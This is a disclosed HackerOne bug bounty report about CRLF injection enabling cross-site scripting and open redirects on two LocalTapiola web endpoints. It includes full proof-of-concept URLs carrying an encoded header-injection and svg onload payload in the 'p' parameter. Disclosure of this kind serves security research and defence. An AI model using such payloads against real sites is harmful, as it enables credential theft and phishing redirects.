@@ -1,0 +1,50 @@
+ReportLink:https://hackerone.com/reports/183796
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/th3g3nt3lman
+ReportedTo:LocalTapiola(localtapiola)
+BountyAmount:450.0
+Severity:medium
+State:Closed
+DateOfDisclosure:10.12.2016 11:56:58
+
+Summary:
+##Issue
+
+The reporter found a simple XSS in verkkopalvelu.lahitapiola.fi but later discovered that the vulnerability also allowed open and unvalidated redirects. 
+
+##Fix
+
+A scheduled signature update to the WAF fixed the issue.
+
+##Reasoning
+
+An XSS as such is not a huge issue from a risk perspective, although it poses a small risk for stealing of credentials. Open redirects allow for far more sophisticated attack vectors using mass phishing emails and a customized malicious login page.
+
+**Summary:**
+Dears,
+Kindly note that after submitting CSRF vulnerability in the subject subdomain which is still triaged https://hackerone.com/reports/178811 I Noticed After more testing to the subject domain that there is multiple endpoints vulnerable to an XSS and those are the same endpoints i included in my first report that vulnerable to CSRF.
+
+**Description:**
+The reason for the XSS basically is "CRLF injection" where i was able to inject http-headers to set custom cookies and custom content "XSS attack" within the response of the website.
+
+"The parameter vulnerable here is parameter p" and you will see that below in the POC
+
+**Endpoints Affected are:**
+https://verkkopalvelu.lahitapiola.fi/a6/VerkkokauppaYTWAR/YT/Etusivu.jsf
+https://verkkopalvelu.lahitapiola.fi/a6/ajoneuvolaskin/MA/Etusivu.jsf
+
+## Browsers / Apps Verified In:
+
+All Browsers
+
+## Steps To Reproduce and POC :
+
+1-https://verkkopalvelu.lahitapiola.fi/a6/VerkkokauppaYTWAR/YT/Etusivu.jsf?productMode=YT&locale=fi&ltapp=LT_Yksityistapaturmalaskuri&p=1412889500323ew2du7e081azeza%22%27%3E%3C%0D%0A+%0D%0A+%3Csvg/onload=alert%28/Xssed_By_G3nt3lman/%29%3E&selectedLanguage=fi&selectedArea=
+
+2-https://verkkopalvelu.lahitapiola.fi/a6/ajoneuvolaskin/MA/Etusivu.jsf?productMode=YT&locale=fi&ltapp=LT_Yksityistapaturmalaskuri&p=1412889500323ew2du7e081azeza%22%27%3E%3C%0D%0A+%0D%0A+%3Csvg/onload=alert%28/Xssed_By_G3nt3lman/%29%3E&selectedLanguage=fi&selectedArea=
+
+When you open each link a pop up will appear (/Xssesd_By_G3nt3lman)
+
+## Additional material
+
+Attached the POC
